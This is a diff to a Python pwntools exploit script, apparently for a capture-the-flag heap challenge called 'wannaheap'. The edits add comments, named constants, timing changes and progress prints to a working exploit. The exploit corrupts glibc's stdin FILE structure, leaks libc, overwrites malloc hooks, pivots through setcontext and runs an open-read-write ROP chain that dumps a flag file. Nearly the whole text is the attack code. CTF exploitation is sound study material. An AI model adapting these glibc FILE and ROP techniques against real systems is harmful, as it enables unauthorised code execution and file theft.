@@ -77,34 +77,43 @@ def conn():
         port = 10305
         return remote(host, port)
 
-
 def Allocate(key, data):
     sa(p, b'>', b'A')
-    sleep(0.1)
+    sleep(0.25)
     sa(p, b'key', key)
-    sleep(0.1)
+    sleep(0.25)
     sa(p, b'data', data)
+    sleep(0.25)
 
 attempt = 0
+
+allocated_size = 0x314000
+max_size = 0x313370
+buf_base_lsb = allocated_size + libc.symbols['_IO_2_1_stdin_'] + 40
 
 while True:
     sleep(0.5)
     p = conn()
 
-    slan(p, b'Size', 0x314000 + libc.symbols['_IO_2_1_stdin_'] + 40)
-    slan(p, b'Size', 0x313370)
+    print("Overwrite _IO_buf_base LSB")
+    slan(p, b'Size', buf_base_lsb)
+    slan(p, b'Size', max_size)
     sla(p, b'Content', b'A')
 
     Allocate(b'\x01', b'A')
     Allocate(b'\x02', A(9)) # Stack contains libc address on the second allocate
     Allocate(b'\x03', b'A')
-
+    
+    sleep(0.25)
+    
+    print("Leaking libc")
     sa(p, b'>', b'R')
-    sleep(0.1)
+    sleep(0.25)
     sa(p, b'key', b'\x02')
 
     r = p.recvuntil(A(8), timeout=0.5)
     if len(r) < 8:
+        print("Failed to leak libc")
         p.close()
         continue
     libc.address = leak_bytes(rn(p, 6), 0x3c2641)
@@ -112,47 +121,53 @@ while True:
 
     sleep(0.25)
 
-    s(p, b'\xff')
+    s(p, b'\xff') # To write more bytes
 
     sleep(0.25)
 
-    s(p, p64(libc.symbols['_IO_2_1_stdin_'] + 0x1337))
+    s(p, p64(libc.symbols['_IO_2_1_stdin_'] + 0x1337)) # To write even more bytes
 
     attach(p)
 
     stdin = flat(
-        libc.symbols['_IO_2_1_stdin_'] + 0x100,
+        libc.symbols['_IO_2_1_stdin_'] + 0x100, # _IO_buf_end
         0,
         0,
         0,
         0,
         0,
         0,
-        0xffffffffffffffff,
+        0xffffffffffffffff, # _old_offset
         0,
-        libc.bss(),
-        0xffffffffffffffff,
+        libc.symbols['_IO_stdfile_0_lock'], # _lock
+        0xffffffffffffffff, # _offset
         0,
-        libc.symbols['_IO_wide_data_0'],
-        0,
-        0,
-        0,
-        0xffffffff,
+        libc.symbols['_IO_wide_data_0'], # _wide_data
         0,
         0,
-        libc.symbols['__GI__IO_file_jumps'],
+        0,
+        0xffffffff, # _mode
+        0,
+        0,
+        libc.symbols['__GI__IO_file_jumps'], # vtable
     )
 
+    mov_rdi_rax_call_dword_rax = libc.address + 0x000000000006ebbb
+
     morecore = flat(
-        libc.address + 0x000000000006ebbb,
+        mov_rdi_rax_call_dword_rax, # __morecore
+
         libc.symbols['print_and_abort'],
         libc.address + 0x18c04e,
         libc.address + 0x18c04e,
     )
 
     new_rsp = libc.symbols['_IO_wide_data_0'] + 8
+    nop_ret = libc.address + 0x000000000017258f
+
     setcontext = flat(
-        libc.symbols['setcontext'] + 46,
+        libc.symbols['setcontext'] + 46, # idk why 53 doesn't work???? omg
+
         0,
         0,
         1,
@@ -163,8 +178,9 @@ while True:
         libc.symbols['__libc_utmp_unknown_functions'],
         libc.symbols['default_file_name'],
         p64(libc.symbols['_nl_C_LC_CTYPE']) * 6,
+
         new_rsp, # rsp
-        libc.address + 0x000000000017258f, # rcx
+        nop_ret, # rcx
     )
 
     pop_rax_ret = libc.address + 0x000000000003a998
@@ -176,61 +192,71 @@ while True:
     flag_addr = flag_path + 0x20
 
     orw_rop = flat(
-        0,
+        0, # padding
+
+        # open("/home/wannaheap/flag", 0, 0)
         pop_rax_ret, 2,
         pop_rdi_ret, flag_path,
         pop_rsi_ret, 0,
         pop_rdx_ret, 0,
         syscall,
 
+        # read(1, flag_addr, 0x100)
         pop_rax_ret, 0,
         pop_rdi_ret, 1,
         pop_rsi_ret, flag_addr,
         pop_rdx_ret, 0x100,
         syscall,
 
+        # write(fd=0, flag_addr, 0x100)
         pop_rax_ret, 1,
-        pop_rdi_ret, 0,
+        pop_rdi_ret, 0, # idk why fd 2 doesn't work???
         pop_rsi_ret, flag_addr,
         pop_rdx_ret, 0x100,
         syscall,
 
+        # exit(0)
         pop_rax_ret, 0x3c,
         pop_rdi_ret, 0,
         syscall,
 
         b'/home/wannaheap/flag\0'
     ).ljust(0x130, b'\0')
-
-    pl = flat(
+    
+    final_payload = flat(
         stdin,
+
         orw_rop,
+
         libc.symbols['__GI__IO_wfile_jumps'],
         0,
         libc.symbols['memalign_hook_ini'],
         libc.symbols['realloc_hook_ini'],
-        libc.symbols['sysmalloc'] + 1521,
+        libc.symbols['sysmalloc'] + 1521, # __malloc_hook
         z(0x898),
+
         morecore,
+
         setcontext
     )
 
+    sleep(0.25)
+
     try:
-        sleep(0.25)
-        
-        s(p, pl)
+        print("Sending final payload", len(final_payload), "bytes")
+        s(p, final_payload)
 
         sleep(0.25)
 
         s(p, b'A')
-
         sleep(0.25)
-
         s(p, b'\x07')
 
-        print(ru(p, b'}').strip().decode())
+        print(f'Flag: {ru(p, b'}').strip().decode()}')
+
         p.close()
         break
     except:
+        print("ROP failed")
         p.close()
         continue
